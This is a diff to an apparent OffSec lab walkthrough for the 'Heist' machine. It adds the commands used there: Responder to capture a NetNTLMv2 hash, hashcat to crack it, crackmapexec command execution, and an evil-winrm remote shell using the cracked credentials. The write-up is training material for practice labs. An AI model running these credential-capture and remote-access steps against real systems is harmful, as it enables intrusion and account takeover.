@@ -319,6 +319,7 @@ Nmap done: 1 IP address (1 host up) scanned in 101.06 seconds
 Enumerated open TCP ports:
 ```bash
 8080
+5985
 ```
 
 Enumerated top 200 UDP ports:
@@ -387,11 +388,15 @@ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
 
 #### - Cat "cracked.txt" file which shows username enox and password california
 
-# PORT 5985
 
 #### - Typed crackmapexec winrm 192.168.123.165 -d heist.offsec -u enox -p california -x "whoami" and found user "heist/enox" is running on the target machine:
 
 ![](Pasted%20image%2020221012181836.png)
+
+
+#### - Typed "evil-winrm -i 192.168.123.165 -u enox -p california" and received the below winrm shell:
+
+![](Pasted%20image%2020221012212318.png)
 
 #### - Typed "net user enox" and noted current user "enox" is a part of "Web Admins" group memberships
 
@@ -403,6 +408,30 @@ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
 
 # Exploitation
 ## Name of the technique
+
+#### - Fire up Responder with the following command:
+
+responder -I tun0 -wv
+
+#responder
+
+#### - Next, we need to send a request to our IP on a port that is not open and we should get a hash in our Responder window. For this example, I just forwarded the request to my IP without specifying a port since my web server is on port 445 and this request will target port 80, which is not open.
+
+![](Pasted%20image%2020221012181516.png)
+
+#### - After sending the request we receive a NetNTLMv2 hash for the user **enox** comes in to our Responder output.
+
+![](Pasted%20image%2020221012181626.png)
+
+#### - Copy the entire hash including the username and use a text editor to paste it into a file named hash.txt. After that, use the following commands to find the cracking mode needed for this hash type and then to begin cracking it:
+
+hashcat -h | grep -i "ntlmv2"
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
+
+#### - After no time at all, the hash is cracked and the password extracted from the cracked.txt file we output the results into.
+
+#### - Cat "cracked.txt" file which shows username enox and password california
+
 
 #### - Typed crackmapexec winrm 192.168.123.165 -d heist.offsec -u enox -p california -x "whoami" and found user "heist/enox" is running on the target machine:
 ---
